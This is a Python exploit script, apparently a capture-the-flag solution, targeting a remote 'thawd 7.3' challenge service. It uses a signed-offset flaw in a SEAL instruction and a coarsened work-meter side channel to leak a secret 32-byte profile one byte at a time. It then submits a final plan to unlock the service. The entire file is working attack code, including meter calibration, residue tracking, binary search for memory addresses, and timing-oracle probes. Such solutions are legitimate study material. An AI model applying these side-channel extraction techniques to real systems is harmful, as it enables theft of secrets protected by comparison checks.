#!/usr/bin/env python3
"""Exploit thawd 7.3's signed SEAL offset and coarsened work meter.

SEAL accepts negative 16-bit offsets, so offset 0x8000 compares a location in
ordinary RAM with the secret profile.  The field meter is floor(work/q): each
matching profile byte contributes one unit.  We align every wrong guess to
residue q-1, turning the next matching byte into a visible +1 meter tick.
"""
from __future__ import annotations
import re, sys
import solve

NOP = solve.ins(0xF)

class MeterSolver:
    def __init__(self, host='0.cloud.chals.io', port=13929):
        self.c=solve.Client(host,port)
        print(self.c.banner,flush=True)
        self.M=int(re.search(r'meter (\d+)',self.c.banner).group(1))
        self.q=self.h=self.r=None
        self.seal_base=None
        self.plans=0

    def raw(self, words):
        z=self.c.plan(words);self.plans+=1
        sp=z.split()
        if len(sp)<2 or not sp[1].isdigit():raise RuntimeError(f'bad answer {z!r}')
        m=int(sp[1]);self.M=m
        return z,m

    def calibrate(self,n=256):
        base=self.M;ys=[]
        for _ in range(n):
            z,m=self.raw([0])
            if not z.startswith('SETTLED '):raise RuntimeError(z)
            ys.append(m)
        mid=self.M;ys2=[]
        for _ in range(n):
            z,m=self.raw([NOP,0])
            if not z.startswith('SETTLED '):raise RuntimeError(z)
            ys2.append(m)
        models=[]
        # A HALT retires once.  Its total cost c is session-constant; q is the
        # session's meter quantum.  Intersect the permitted initial-residue
        # intervals instead of brute-forcing every residue.
        for q in range(2,513):
            for c in range(1,65):
                lo,hi=0,q-1
                for i,m in enumerate(ys,1):
                    d=m-base
                    lo=max(lo,q*d-c*i)
                    hi=min(hi,q*(d+1)-1-c*i)
                    if lo>hi:break
                if lo<=hi:
                    for r0 in range(lo,hi+1):models.append((q,c,r0))
        if not models:raise RuntimeError('could not calibrate meter')
        # A reachable NOP increases the cost by exactly one.  This removes
        # scaled floor-model aliases (for example q=22,c=5 versus the actual
        # q=44,c=10), which HALTs alone cannot distinguish.
        models=[(q,c,r0) for q,c,r0 in models
                if all(mid+(((r0+c*n)%q)+(c+1)*i)//q==m
                       for i,m in enumerate(ys2,1))]
        if len(models)!=1:raise RuntimeError(f'ambiguous meter models: {models[:20]}')
        q,c,r0=models[0]
        self.q=q;self.h=c-1;self.r=(r0+c*n+(c+1)*n)%q
        print(f'meter q={q} halt_cost={c} overhead={self.h} residue={self.r}',flush=True)
        self.align_sanity()
        self.calibrate_seal_base()

    def calibrate_seal_base(self):
        """Measure SEAL's fixed charge using its zero-filled negative source."""
        base=self.M;start_r=self.r;ys=[]
        w=[solve.ldi(4,0x8000),solve.seal(4),0]  # three retired instructions
        for _ in range(self.q):
            z,m=self.raw(w)
            if not z.startswith('SETTLED '):raise RuntimeError(z)
            ys.append(m)
        costs=[]
        for cost in range(self.h+3,self.h+3+40):
            if all(base+(start_r+cost*i)//self.q==m for i,m in enumerate(ys,1)):
                costs.append(cost)
        if len(costs)!=1:raise RuntimeError(f'ambiguous SEAL base cost: {costs}')
        self.seal_base=costs[0]-(self.h+3)
        # q equal-cost plans preserve the residue.
        self.r=start_r
        print(f'SEAL base charge={self.seal_base}',flush=True)
        if self.seal_base>1:
            raise RuntimeError('zero source already matches multiple profile bytes; reconnect for a cleaner session')

    def align_sanity(self):
        # NOP^p;HALT retires p+1 and costs h+p+1.  End at q-1.
        b=self.h+1
        p=(self.q-1-(self.r+b))%self.q
        oldM=self.M;inc=(self.r+b+p)//self.q
        z,m=self.raw([NOP]*p+[0])
        if not z.startswith('SETTLED ') or m!=oldM+inc:
            raise RuntimeError(f'meter model failed sanity: p={p} expected {oldM+inc}, got {z}')
        self.r=self.q-1

    def recover_residue(self):
        """Recover current hidden residue without needing to know prior match run."""
        import math
        base=self.M;ys=[]
        # Pick a plan cost coprime to q so the staircase visits every residue;
        # q copies then reveal the exact starting residue and preserve it.
        p=next(x for x in range(self.q) if math.gcd(self.h+1+x,self.q)==1)
        c=self.h+1+p
        for _ in range(self.q):
            z,m=self.raw([NOP]*p+[0])
            if not z.startswith('SETTLED '):raise RuntimeError(z)
            ys.append(m)
        poss=[]
        for r0 in range(self.q):
            if all(base+(r0+c*i)//self.q==m for i,m in enumerate(ys,1)):
                poss.append(r0)
        if len(poss)!=1:raise RuntimeError(f'ambiguous current residue: {poss}')
        # q identical costs preserve the residue modulo q.
        self.r=poss[0]

    def probe(self,builder,retired_without_pad,known_matches=0,tag=''):
        """Return True iff SEAL matched at least one byte beyond known_matches."""
        # Beyond its measured fixed charge, SEAL contributes one meter-work
        # unit for every equal byte before the first mismatch.
        basecost=self.h+retired_without_pad+self.seal_base+known_matches
        pad=(self.q-1-(self.r+basecost))%self.q
        expected=self.M+(self.r+basecost+pad)//self.q
        z,m=self.raw(builder(pad))
        if not z.startswith('SETTLED '):
            raise RuntimeError(f'probe fault {tag}: {z}')
        if m==expected:
            self.r=self.q-1
            return False
        if m>expected:
            # Baseline ended at q-1.  At most 32 comparison units follow, and
            # observed q values are larger, so a genuine match adds one tick.
            if m!=expected+1:
                print(f'warning: {tag} jumped {m-expected} ticks',flush=True)
            self.r=None
            return True
        raise RuntimeError(f'meter went backwards from expected {expected}: {z}')

    @staticmethod
    def fill_all(g,pad):
        p=solve.Program()
        p.emit(solve.ldi(1,(g<<8)|g));p.emit(solve.ldi(2,0));p.emit(solve.ldi(3,16384))
        p.label('loop');p.emit(solve.stw(1,2,0));p.emit(solve.alui(2,2,'ADD',2));p.emit_djnz(3,'loop')
        p.emit(solve.ldi(4,0x8000));p.emit(solve.seal(4))
        for _ in range(pad):p.emit(NOP)
        p.emit(0);return p.patch()

    def recover_first(self):
        for g in range(256):
            ok=self.probe(lambda pad,g=g:self.fill_all(g,pad),49158,0,f'p0={g:02x}')
            if ok:
                print(f'P[00]={g:02x} (plans={self.plans})',flush=True)
                self.recover_residue();return g
        raise RuntimeError('no first byte matched')

    @staticmethod
    def fill_range(start_words,count_words,g,pad,off=0x8000):
        p=solve.Program();p.emit(solve.ldi(1,(g<<8)|g));p.emit(solve.ldi(2,2*start_words));p.emit(solve.ldi(3,count_words))
        p.label('loop');p.emit(solve.stw(1,2,0));p.emit(solve.alui(2,2,'ADD',2));p.emit_djnz(3,'loop')
        p.emit(solve.ldi(4,off));p.emit(solve.seal(4))
        for _ in range(pad):p.emit(NOP)
        p.emit(0);return p.patch()

    @staticmethod
    def one_byte(addr,g,pad,off=0x8000):
        w=[solve.ldi(1,g),solve.stb(1,0,addr),solve.ldi(4,off),solve.seal(4)]
        return w+[NOP]*pad+[0]

    def locate_source(self,p0,off=0x8000):
        if p0==0:raise RuntimeError('P[0] is zero; reconnect so zero-filled RAM can be used as the negative oracle baseline')
        lo,hi=0,16384 # word cells
        while hi-lo>1:
            mid=(lo+hi)//2;count=mid-lo
            inside=self.probe(lambda pad,lo=lo,count=count:self.fill_range(lo,count,p0,pad,off),3*count+6,0,f'addr words [{lo},{mid})')
            if inside:
                hi=mid;self.recover_residue()
            else:lo=mid
            print(f'address word range [{lo:#x},{hi:#x})',flush=True)
        even=2*lo
        is_even=self.probe(lambda pad:self.one_byte(even,p0,pad,off),5,0,'address parity')
        if is_even:
            addr=even;self.recover_residue()
        else:addr=even+1
        print(f'SEAL({off:#06x}) first source byte is RAM address = {addr:#06x}',flush=True)
        if addr+31>=0x8000:raise RuntimeError('source profile span crosses out of writable RAM')
        return addr

    @staticmethod
    def prefix_plan(addr,data,pad):
        w=[]
        i=0
        while i+1<len(data):
            w += [solve.ldi(1,(data[i]<<8)|data[i+1]),solve.stw(1,0,addr+i)]
            i+=2
        if i<len(data):w += [solve.ldi(1,data[i]),solve.stb(1,0,addr+i)]
        w += [solve.ldi(4,0x8000),solve.seal(4)]
        w += [NOP]*pad+[0]
        return w

    def recover_rest(self,addr,prefix):
        p=bytearray(prefix)
        # Timing distinguishes an extra comparison only through byte 30.  At
        # byte 31 both mismatch and full equality examine exactly 32 bytes;
        # use the gate/CONT verdict for that final byte instead.
        while len(p)<31:
            k=len(p)
            for g in range(256):
                data=bytes(p)+bytes([g])
                retired=2*((len(data)+1)//2)+3
                ok=self.probe(lambda pad,data=data:self.prefix_plan(addr,data,pad),retired,k,f'P[{k}]={g:02x}')
                if ok:
                    p.append(g);print(f'P[{k:02d}]={g:02x}  profile={p.hex()} (plans={self.plans})',flush=True)
                    self.recover_residue();break
            else:raise RuntimeError(f'no candidate for byte {k}')
        k=31
        for g in range(256):
            data=bytes(p)+bytes([g])
            w=[]
            for i,v in enumerate(data):w += [solve.ldi(1,v),solve.stb(1,0,addr+i)]
            w += [solve.ldi(4,0x8000),solve.seal(4)]
            cont_i=len(w);w += [solve.ldi(15,0),solve.stw(15,0,0x8200),0]
            priv=len(w);w += [solve.att(3,0,0),0]
            w[cont_i]=solve.ldi(15,0x8000|priv)
            z,m=self.raw(w)
            if z.startswith('SETTLED '):
                p.append(g);print(f'P[31]={g:02x}  profile={p.hex()} (plans={self.plans})',flush=True);break
            if not z.startswith('FAULT '):raise RuntimeError(f'unexpected final-byte answer {z}')
        else:raise RuntimeError('no candidate for final byte')
        return bytes(p)

    def finish(self,addr,profile):
        # The signed SEAL source doubles as the K table used by the fold code.
        words=solve.thaw_program(0x8000,profile,profile_addr=addr)
        z,m=self.raw(words);print('FINAL',z,flush=True)
        if not z.startswith('THAWED '):raise RuntimeError('final plan did not thaw')
        return z

    def run(self):
        self.calibrate()
        p0=self.recover_first()
        addr=self.locate_source(p0)
        profile=self.recover_rest(addr,bytes([p0]))
        print('PROFILE',profile.hex(),flush=True)
        return self.finish(addr,profile)

if __name__=='__main__':
    MeterSolver().run()
